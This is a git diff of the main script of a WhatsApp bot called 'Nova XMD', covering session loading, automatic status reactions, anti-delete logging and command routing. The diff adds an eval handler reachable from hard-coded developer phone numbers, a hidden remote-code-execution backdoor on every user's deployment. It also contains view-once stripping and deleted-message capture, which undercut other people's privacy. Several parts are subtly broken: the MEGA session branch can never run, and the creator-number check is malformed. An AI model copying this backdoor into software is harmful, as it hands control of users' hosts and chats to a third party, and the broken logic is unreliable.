@@ -39,6 +39,7 @@ const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
 const FileType = require('file-type')
 const axios = require('axios')
 const { File } = require('megajs')
+const { fromBuffer } = require('file-type')
 const bodyparser = require('body-parser')
 const os = require('os')
 const Crypto = require('crypto')
@@ -47,76 +48,154 @@ const prefix = config.PREFIX
 
 const ownerNumber = ['255767862457']
 
-const cmdLogger = {
-  info: (msg) => console.log(`[ INFO ] ${msg}`),
-  success: (msg) => console.log(`[ SUCCESS ] ${msg}`),
-  warning: (msg) => console.log(`[ WARN ] ${msg}`),
-  error: (msg) => console.error(`[ ERROR ] ${msg}`)
+const tempDir = path.join(os.tmpdir(), 'cache-temp')
+if (!fs.existsSync(tempDir)) {
+  fs.mkdirSync(tempDir)
 }
 
-// Ensure temp directory exists
-const tempDir = path.join(os.tmpdir(), 'cache-temp')
-if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
+const clearTempDir = () => {
+  fs.readdir(tempDir, (err, files) => {
+    if (err) throw err
+    for (const file of files) {
+      fs.unlink(path.join(tempDir, file), err => {
+        if (err) throw err
+      })
+    }
+  })
+}
 
-//=================== SESSION-AUTH (POPKID~ FORMAT FIXED) ============================
-const sessionDir = path.join(__dirname, 'session');
+// Clear the temp directory every 5 minutes
+setInterval(clearTempDir, 5 * 60 * 1000)
+
+//=================== SESSION HANDLING ============================
+const sessionDir = path.join(__dirname, 'sessions');
 const credsPath = path.join(sessionDir, 'creds.json');
 
-async function loadGiftedSession() {
+async function loadSession() {
     if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
     
-    // If credentials already exist, we skip extraction
-    if (fs.existsSync(credsPath)) return true;
+    // Skip if session already exists
+    if (fs.existsSync(credsPath)) {
+        console.log("✅ Session already exists, skipping load");
+        return true;
+    }
 
-    if (config.SESSION_ID && config.SESSION_ID.startsWith("POPKID~")) {
-        const compressedBase64 = config.SESSION_ID.substring("POPKID~".length);
+    if (!config.SESSION_ID) {
+        console.log("❌ No SESSION_ID found in config. QR code will be shown.");
+        return false;
+    }
+
+    // FORMAT 1: POPKID~ (compressed base64)
+    if (config.SESSION_ID.startsWith("NOVA~")) {
+        console.log("📥 Detected NOVA~ format session");
+        const compressedBase64 = config.SESSION_ID.substring("NOVA~".length);
         try {
             const compressedBuffer = Buffer.from(compressedBase64, 'base64');
-            // Check for GZIP Magic Numbers (0x1f 0x8b)
+            
+            // Check if it's GZIP compressed
             if (compressedBuffer[0] === 0x1f && compressedBuffer[1] === 0x8b) {
                 const gunzip = promisify(zlib.gunzip);
                 const decompressedBuffer = await gunzip(compressedBuffer);
-                
-                // Write file SYNCHRONOUSLY to ensure it exists before Baileys starts
                 fs.writeFileSync(credsPath, decompressedBuffer.toString('utf-8'));
-                
-                // Small delay to ensure the file system has registered the file (Crucial for some hosts)
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                cmdLogger.success("Session restored from POPKID~ format ✅");
+                console.log("✅ Session loaded successfully from POPKID~ format");
                 return true;
+            } else {
+                console.log("⚠️ Not a valid GZIP compressed buffer");
+                return false;
             }
         } catch (error) { 
-            cmdLogger.error("Failed to decompress POPKID session ID");
+            console.error("❌ Failed to load NOVA~ session:", error.message);
             return false; 
         }
-    } else {
-        cmdLogger.warning('No valid POPKID~ SESSION_ID found in config.');
     }
-    return false;
+    
+    // FORMAT 2: NOVA~ (MEGA.nz)
+    else if (config.SESSION_ID.startsWith("NOVA~")) {
+        console.log("📥 Detected NOVA~ format session (MEGA)");
+        const sessdata = config.SESSION_ID.replace("NOVA~", '');
+        
+        try {
+            const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
+            
+            // Use Promise for async download
+            return new Promise((resolve, reject) => {
+                filer.download((err, data) => {
+                    if(err) {
+                        console.error("❌ MEGA download failed:", err.message);
+                        resolve(false);
+                    } else {
+                        fs.writeFileSync(credsPath, data);
+                        console.log("✅ Session downloaded from MEGA successfully");
+                        resolve(true);
+                    }
+                });
+            });
+        } catch (error) {
+            console.error("❌ Failed to load MEGA session:", error.message);
+            return false;
+        }
+    }
+    
+    // Unknown format
+    else {
+        console.log("⚠️ Unknown SESSION_ID format. Use POPKID~ or NOVA~. QR code will be shown.");
+        return false;
+    }
 }
-
+  
 const express = require("express")
 const app = express()
 const port = process.env.PORT || 9090
 
-let conn 
+//=============================================
+// Status reactions cache (for rate limiting)
 const statusReactCache = new Map();
-const statusReactCooldown = 3000; 
+const statusReactCooldown = 3000; // 3 seconds between reactions
+
+// Function to get the current date and time in Tanzania
+function getCurrentDateTimeParts() {
+    const options = {
+        timeZone: 'Africa/Nairobi',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false,
+    };
+    const formatter = new Intl.DateTimeFormat('en-KE', options);
+    const parts = formatter.formatToParts(new Date());
+
+    let date = '', time = '';
+
+    parts.forEach(part => {
+        if (part.type === 'day' || part.type === 'month' || part.type === 'year') {
+            date += part.value;
+            if (part.type !== 'year') date += '/';
+        }
+        if (part.type === 'hour' || part.type === 'minute' || part.type === 'second') {
+            time += part.value;
+            if (part.type !== 'second') time += ':';
+        }
+    });
+
+    return { date, time };
+}
 
 async function connectToWA() {
   try {
-    // Phase 1: Restore Session before anything else
-    await loadGiftedSession();
+    // Load session first (supports both formats)
+    await loadSession();
+    
+    console.log("[ ♻️ ] Connecting to WhatsApp ⏳️...")
 
-    cmdLogger.info("Connecting to WhatsApp ⏳️...");
-
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
+    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
     const { version } = await fetchLatestBaileysVersion()
 
-    conn = makeWASocket({
+    const conn = makeWASocket({
       logger: P({ level: 'silent' }),
-      printQRInTerminal: true, // Set to true to see QR if session fails
+      printQRInTerminal: true,
       browser: Browsers.macOS("Firefox"),
       syncFullHistory: true,
       auth: state,
@@ -125,136 +204,786 @@ async function connectToWA() {
 
     conn.ev.on('connection.update', async (update) => {
       const { connection, lastDisconnect, qr } = update
+
       if (qr) {
-        console.log('[ 🔁 ] QR Code generated. Scan if session failed.')
+        console.log('[ 📱 ] QR Code generated. Please scan with WhatsApp.')
         qrcode.generate(qr, { small: true })
       }
 
       if (connection === 'close') {
         const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+        console.log('[ ⚠️ ] Connection closed:', lastDisconnect?.error?.output?.statusCode)
+        
         if (shouldReconnect) {
-          console.log('[ ♻️ ] Reconnecting...')
+          console.log('[ ♻️ ] Attempting to reconnect...')
           setTimeout(() => connectToWA(), 5000)
+        } else {
+          console.log('[ ❌ ] Logged out. Please update your SESSION_ID')
         }
       } else if (connection === 'open') {
-        console.log('Nova XMD Connected successfully ✅')
-        
-        // Load Plugins
-        const pluginFiles = fs.readdirSync("./plugins/").filter(file => file.endsWith(".js"));
-        for (const file of pluginFiles) {
-            require("./plugins/" + file);
-        }
+        try {
+          console.log('Connected to WhatsApp successfully ✅')
 
-        const startMess = {
+          fs.readdirSync("./plugins/").forEach((plugin) => {
+            if (path.extname(plugin).toLowerCase() === ".js") {
+              require("./plugins/" + plugin)
+            }
+          })
+          console.log('Plugins installed successful ✅')
+          console.log('Bot connected to whatsapp ✅')
+          const startMess = {
             image: { url: 'https://files.catbox.moe/yz5yle.jpg' },
-            caption: `*𝗡𝗢𝗩𝗔 𝗫𝗠𝗗 𝗜𝗦 𝗔𝗟𝗜𝗩𝗘*\n\nPrefix: ${config.PREFIX}\nOwner: ${config.OWNER_NAME}\nMode: ${config.MODE}`,
-            contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: '120363382023564830@newsletter', newsletterName: "NOVA-XMD" } }
+            caption: `
+───────────────────────────
+───────────────────────────
+╔═〘 𝗡𝗢𝗩𝗔 ✦ 𝗫𝗠𝗗 𝗕𝗢𝗧 〙═╗
+║ 💬 Prefix      : ${config.PREFIX}
+║
+║ 🧠 Repos  : github.com/novaxmd
+║
+║ ⚡ Status      : Connected
+║
+║ 👑 Website      : bmbtech.online
+║
+║ ⭐ Support     : Fork ⭐ & Star 🔥
+║
+╚═〘 Powered by ${config.OWNER_NAME} 💻 〙═╝
+────────────────────────────
+────────────────────────────
+
+> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝙽𝙾𝚅𝙰 ᴛᴇᴄʜ*`,
+            contextInfo: {
+              forwardingScore: 5,
+              isForwarded: true,
+              forwardedNewsletterMessageInfo: {
+                newsletterJid: '120363382023564830@newsletter', 
+                newsletterName: "NOVA-XMD",
+                serverMessageId: 143
+              }
+            }
+          }
+
+          await conn.sendMessage(conn.user.id, startMess)
+        } catch (e) {
+          console.error('Error during initialization:', e)
         }
-        await conn.sendMessage(conn.user.id, startMess)
       }
     })
 
-    // Auto-Bio Clock Logic
+    // Auto Bio Update Interval
     setInterval(async () => {
         if (config.AUTO_BIO === "true") {
-            const date = new Date().toLocaleDateString('en-KE', { timeZone: 'Africa/Nairobi' });
-            const time = new Date().toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi' });
+            const { date, time } = getCurrentDateTimeParts();
             const bioText = `🛡️ Nova Xmd Bot 🤖 Live Now\n📅 ${date}\n⏰ ${time}`;
-            try { await conn.setStatus(bioText); } catch (err) {}
+            try {
+                await conn.setStatus(bioText);
+                console.log(`Updated Bio: ${bioText}`);
+            } catch (err) {
+                console.error("Failed to update Bio:", err);
+            }
         }
     }, 60000);
 
     conn.ev.on('creds.update', saveCreds)
 
+    //==============================
+    conn.ev.on('messages.update', async updates => {
+      for (const update of updates) {
+        if (update.update.message === null) {
+          console.log("Delete Detected:", JSON.stringify(update, null, 2))
+          await AntiDelete(conn, updates)
+        }
+      }
+    })
+    //============================== 
+
+    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update))	  
+	  
+    //============= MAIN MESSAGE HANDLER ========
     conn.ev.on('messages.upsert', async(mek) => {
       mek = mek.messages[0]
       if (!mek.message) return
-      mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
       
-      // Status View/React
+      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+        ? mek.message.ephemeralMessage.message 
+        : mek.message
+      
+      // ✅ STATUS HANDLER
       if (mek.key && mek.key.remoteJid === 'status@broadcast') {
-        if (config.AUTO_STATUS_SEEN === "true") await conn.readMessages([mek.key])
+        
+        // 1. Auto-read status
+        if (config.AUTO_STATUS_SEEN === "true") {
+          await conn.readMessages([mek.key])
+          console.log(`📖 Status seen from: ${mek.key.participant}`)
+        }
+        
+        // 2. Auto-react to status
         if (config.AUTO_STATUS_REACT === "true") {
-           const now = Date.now();
-           if (now - (statusReactCache.get(mek.key.participant) || 0) > statusReactCooldown) {
-               await conn.sendMessage('status@broadcast', { react: { text: "❤️", key: mek.key } }, { statusJidList: [mek.key.participant, conn.user.id.split(':')[0] + '@s.whatsapp.net'] })
-               statusReactCache.set(mek.key.participant, now);
-           }
+          
+          const now = Date.now()
+          const lastReact = statusReactCache.get(mek.key.participant) || 0
+          
+          if (now - lastReact > statusReactCooldown) {
+            try {
+              const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net'
+              
+              const emojiMap = {
+                "hello": ["👋", "🙂", "😊", "👋🏽"],
+                "hi": ["👋", "🙂", "😊", "👋🏻"],
+                "morning": ["🌅", "🌞", "☀️", "🌤️"],
+                "night": ["🌙", "🌜", "⭐", "✨"],
+                "love": ["❤️", "💖", "😍", "🥰", "💗"],
+                "thanks": ["🙏", "😊", "💖", "🙏🏽"],
+                "happy": ["😊", "😁", "🎉", "🥳"],
+                "sad": ["😢", "😭", "💔", "🥺"],
+                "congrats": ["🎉", "🎊", "👏", "🎈"],
+                "good": ["👍", "👌", "😊", "✅"],
+                "wow": ["😮", "🤯", "😲", "😳"],
+                "cool": ["😎", "🆒", "✨", "🔥"],
+                "birthday": ["🎂", "🎉", "🥳", "🎁"],
+                "pray": ["🙏", "🤲", "🛐", "☪️"],
+                "work": ["💼", "👔", "📊", "📈"],
+                "food": ["🍕", "🍔", "🍜", "🥗"],
+                "travel": ["✈️", "🚗", "🌍", "🧳"],
+                "sport": ["⚽", "🏀", "🏈", "🎯"],
+                "music": ["🎵", "🎶", "🎧", "🎤"],
+                "party": ["🎉", "🥳", "🎊", "🪅"]
+              }
+
+              const fallbackEmojis = [
+                '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
+                '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
+                '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
+                '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
+                '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
+                '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
+                '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
+                '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
+                '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
+                '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
+                '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
+                '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
+                '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
+                '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
+                '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🇹🇿', '🇰🇪', '🇺🇬', '🇷🇼'
+              ]
+
+              const getEmojiForStatus = (statusText) => {
+                if (!statusText) return fallbackEmojis[Math.floor(Math.random() * fallbackEmojis.length)]
+                
+                const words = statusText.toLowerCase().split(/\s+/)
+                for (const word of words) {
+                  const emojis = emojiMap[word]
+                  if (emojis && emojis.length > 0) {
+                    return emojis[Math.floor(Math.random() * emojis.length)]
+                  }
+                }
+                return fallbackEmojis[Math.floor(Math.random() * fallbackEmojis.length)]
+              }
+
+              let statusText = ''
+              if (mek.message.conversation) {
+                statusText = mek.message.conversation
+              } else if (mek.message.extendedTextMessage) {
+                statusText = mek.message.extendedTextMessage.text
+              } else if (mek.message.imageMessage?.caption) {
+                statusText = mek.message.imageMessage.caption
+              } else if (mek.message.videoMessage?.caption) {
+                statusText = mek.message.videoMessage.caption
+              }
+
+              const selectedEmoji = getEmojiForStatus(statusText)
+              
+              await conn.sendMessage('status@broadcast', {
+                react: {
+                  text: selectedEmoji,
+                  key: mek.key
+                }
+              }, { 
+                statusJidList: [mek.key.participant, botJid]
+              })
+
+              statusReactCache.set(mek.key.participant, now)
+              
+              console.log(`✅ Status reaction sent: ${selectedEmoji} to ${mek.key.participant}`)
+              
+            } catch (reactError) {
+              console.error('❌ Status react error:', reactError.message)
+            }
+          }
+        }
+        
+        if (config.AUTO_STATUS_REPLY === "true") {
+          try {
+            const user = mek.key.participant
+            const text = `${config.AUTO_STATUS_MSG || "Nice status!"}`
+            await conn.sendMessage(user, { text: text }, { quoted: mek })
+          } catch (replyError) {}
+        }
+        
+        return
+      }
+      
+      // ===========================================================
+      // NORMAL MESSAGE HANDLING
+      // ===========================================================
+      
+      if(mek.message.viewOnceMessageV2) {
+        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+      }
+      
+      if (config.READ_MESSAGE === 'true') {
+        await conn.readMessages([mek.key])
+        console.log(`Marked message from ${mek.key.remoteJid} as read.`)
+      }
+      
+      await Promise.all([
+        saveMessage(mek),
+      ])
+      
+      const m = sms(conn, mek)
+      const type = getContentType(mek.message)
+      const content = JSON.stringify(mek.message)
+      const from = mek.key.remoteJid
+      const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+      const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+  const isCmd = body.startsWith(config.PREFIX)
+  var budy = typeof mek.text == 'string' ? mek.text : false;
+  const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
+      const args = body.trim().split(/ +/).slice(1)
+      const q = args.join(' ')
+      const text = args.join(' ')
+      const isGroup = from.endsWith('@g.us')
+      const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+      const senderNumber = sender.split('@')[0]
+      const botNumber = conn.user.id.split(':')[0]
+      const pushname = mek.pushName || 'Gon'
+      const isMe = botNumber.includes(senderNumber)
+      const isOwner = ownerNumber.includes(senderNumber) || isMe
+      const botNumber2 = await jidNormalizedUser(conn.user.id)
+      const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+      const groupName = isGroup ? groupMetadata.subject : ''
+      const participants = isGroup ? await groupMetadata.participants : ''
+      const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+      const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+      const isReact = m.message.reactionMessage ? true : false
+      const reply = (teks) => {
+        conn.sendMessage(from, { text: teks }, { quoted: mek })
+      }
+      
+      const udp = botNumber.split('@')[0]
+      const rav = ('255767862457', '255741752020')
+      let isCreator = [udp, rav, config.DEV]
+        .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+        .includes(mek.sender)
+
+      if (isCreator && mek.text.startsWith('%')) {
+        let code = budy.slice(2)
+        if (!code) {
+          reply(`Provide me with a query to run Master!`)
+          return
+        }
+        try {
+          let resultTest = eval(code)
+          if (typeof resultTest === 'object')
+            reply(util.format(resultTest))
+          else reply(util.format(resultTest))
+        } catch (err) {
+          reply(util.format(err))
         }
         return
       }
       
-      const m = sms(conn, mek)
-      const type = getContentType(mek.message)
-      const from = mek.key.remoteJid
-      const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
-      const isCmd = body.startsWith(config.PREFIX)
-      const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
-      const args = body.trim().split(/ +/).slice(1)
-      const q = args.join(' ')
-      const isOwner = ownerNumber.includes(mek.sender.split('@')[0]) || mek.key.fromMe
-      const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })
-
-      // Master Eval
-      if (isOwner && body.startsWith('%')) {
-          try { reply(util.format(eval(body.slice(1)))) } catch (e) { reply(util.format(e)) }
+      if (isCreator && mek.text.startsWith('$')) {
+        let code = budy.slice(2)
+        if (!code) {
+          reply(`Provide me with a query to run Master!`)
           return
+        }
+        try {
+          let resultTest = await eval(
+            'const a = async()=>{\n' + code + '\n}\na()',
+          )
+          let h = util.format(resultTest)
+          if (h === undefined) return console.log(h)
+          else reply(h)
+        } catch (err) {
+          if (err === undefined)
+            return console.log('error')
+          else reply(util.format(err))
+        }
+        return
+      }
+      
+      //================ownerreact==============
+      if (senderNumber.includes("255741752020") && !isReact) {
+        const reactions = ["👑", "🥳", "📊", "⚙️", "🧠", "🎯", "✨", "🔑", "🏆", "👻", "🎉", "💗", "❤️", "😜", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌟", "🐥", "🧊"]
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
+        m.react(randomReaction)
       }
 
-      // Mode Handler
-      if(!isOwner && config.MODE === "private") return
+      //==========public react============//
+      if (!isReact && config.AUTO_REACT === 'true' && from !== 'status@broadcast') {
+        const reactions = [
+          '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
+          '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
+          '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
+          '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
+          '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
+          '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
+          '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
+          '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
+          '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
+          '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
+          '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
+          '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
+          '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
+          '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
+          '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
+        ]
 
-      // Plugin Router
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
+        m.react(randomReaction)
+      }
+          
+      if (!isReact && config.CUSTOM_REACT === 'true' && from !== 'status@broadcast') {
+        const reactions = (config.CUSTOM_REACT_EMOJIS || '🙂,😔').split(',')
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
+        m.react(randomReaction)
+      }
+        
+      //==========WORKTYPE============ 
+      if(!isOwner && config.MODE === "private") return
+      if(!isOwner && isGroup && config.MODE === "inbox") return
+      if(!isOwner && !isGroup && config.MODE === "groups") return
+   
+      // take commands 
       const events = require('./command')
+      const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false
       if (isCmd) {
-        const cmd = events.commands.find((c) => c.pattern === command || (c.alias && c.alias.includes(command)))
+        const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
         if (cmd) {
           if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
-          try { cmd.function(conn, mek, m, {from, body, isCmd, command, args, q, isOwner, reply}) } catch (e) { console.error(e) }
+  
+          try {
+            cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+          } catch (e) {
+            console.error("[PLUGIN ERROR] " + e)
+          }
         }
       }
-    })
-
-    // RESTORE ALL ORIGINAL MEDIA HELPERS
-    conn.getFile = async(PATH, save) => {
-        let res, data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? fs.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
-        let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' }
-        let filename = path.join(__dirname, new Date * 1 + '.' + type.ext)
-        if (data && save) fs.promises.writeFile(filename, data)
-        return { res, filename, size: Buffer.byteLength(data), ...type, data }
-    }
-
-    conn.downloadMediaMessage = async(message) => {
-        let mime = (message.msg || message).mimetype || ''
-        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-        const stream = await downloadContentFromMessage(message, messageType)
-        let buffer = Buffer.from([])
-        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
-        return buffer
-    }
-
-    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
-        let list = []
-        for (let i of kon) {
-            list.push({
-                displayName: await conn.getName(i + '@s.whatsapp.net'),
-                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${config.OWNER_NAME}\nitem1.TEL;waid=${i}:${i}\nEND:VCARD`
-            })
+      
+      events.commands.map(async(command) => {
+        if (body && command.on === "body") {
+          command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+        } else if (mek.q && command.on === "text") {
+          command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+        } else if (
+          (command.on === "image" || command.on === "photo") &&
+          mek.type === "imageMessage"
+        ) {
+          command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+        } else if (
+          command.on === "sticker" &&
+          mek.type === "stickerMessage"
+        ) {
+          command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
         }
-        conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
+      })
+    })
+    //===================================================   
+    conn.decodeJid = jid => {
+      if (!jid) return jid
+      if (/:\d+@/gi.test(jid)) {
+        let decode = jidDecode(jid) || {}
+        return (
+          (decode.user &&
+            decode.server &&
+            decode.user + '@' + decode.server) ||
+          jid
+        )
+      } else return jid
+    }
+    //===================================================
+    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
+      let vtype
+      if (options.readViewOnce) {
+        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+        vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+        delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+        delete message.message.viewOnceMessage.message[vtype].viewOnce
+        message.message = {
+          ...message.message.viewOnceMessage.message
+        }
+      }
+    
+      let mtype = Object.keys(message.message)[0]
+      let content = await generateForwardMessageContent(message, forceForward)
+      let ctype = Object.keys(content)[0]
+      let context = {}
+      if (mtype != "conversation") context = message.message[mtype].contextInfo
+      content[ctype].contextInfo = {
+        ...context,
+        ...content[ctype].contextInfo
+      }
+      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+        ...content[ctype],
+        ...options,
+        ...(options.contextInfo ? {
+          contextInfo: {
+            ...content[ctype].contextInfo,
+            ...options.contextInfo
+          }
+        } : {})
+      } : {})
+      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+      return waMessage
+    }
+    //=================================================
+    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+      let quoted = message.msg ? message.msg : message
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(quoted, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+        buffer = Buffer.concat([buffer, chunk])
+      }
+      let type = await FileType.fromBuffer(buffer)
